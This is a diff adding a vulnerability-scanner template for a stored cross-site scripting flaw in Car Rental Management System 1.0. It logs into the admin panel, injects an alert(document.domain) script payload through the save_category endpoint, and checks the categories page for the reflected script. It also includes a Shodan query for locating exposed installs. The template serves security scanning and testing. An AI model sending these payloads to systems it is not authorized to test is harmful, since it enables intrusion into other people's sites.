@@ -1,0 +1,70 @@
+id: carrental-xss
+
+info:
+  name: Car Rental Management System 1.0 - Cross-Site Scripting
+  author: arafatansari
+  severity: medium
+  description: |
+    Car Rental Management System 1.0 contains a cross-site scripting vulnerability via admin/ajax.php?action=save_category in Name and Description parameter.
+  reference:
+    - https://www.exploit-db.com/exploits/49546
+    - https://www.sourcecodester.com/
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
+    cvss-score: 5.4
+    cwe-id: CWE-80
+  metadata:
+    verified: true
+    max-request: 3
+    shodan-query: http.html:"Car Rental Management System"
+  tags: xss,cms,authenticated,edb,intrusive
+
+http:
+  - raw:
+      - |
+        POST /admin/ajax.php?action=login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username={{username}}&password={{password}}
+      - |
+        POST /admin/ajax.php?action=save_category HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryCMJ5bh3B6m9767Em
+
+        ------WebKitFormBoundaryCMJ5bh3B6m9767Em
+        Content-Disposition: form-data; name="id"
+
+        ------WebKitFormBoundaryCMJ5bh3B6m9767Em
+        Content-Disposition: form-data; name="name"
+
+        </script><script>alert(document.domain)</script>
+        ------WebKitFormBoundaryCMJ5bh3B6m9767Em
+        Content-Disposition: form-data; name="description"
+
+        <script>alert(document.domain)</script>
+        ------WebKitFormBoundaryCMJ5bh3B6m9767Em--
+      - |
+        GET /admin/index.php?page=categories HTTP/1.1
+        Host: {{Hostname}}
+
+    host-redirects: true
+    max-redirects: 2
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '<p>Name: <b></script><script>alert(document.domain)</script></b>'
+
+      - type: word
+        part: header
+        words:
+          - text/html
+
+      - type: status
+        status:
+          - 200
+
+# digest: 4a0a00473045022100f9ba9f9f4a1ebd43c991ea5b8f2aa02511692f41cdf97f78d998f4e525a91fab02205a39770dd5d8fc210f5e66877e84641e25842fdd4c0d499505216aa3df35505f:922c64590222798bb761d5b6d8e72950
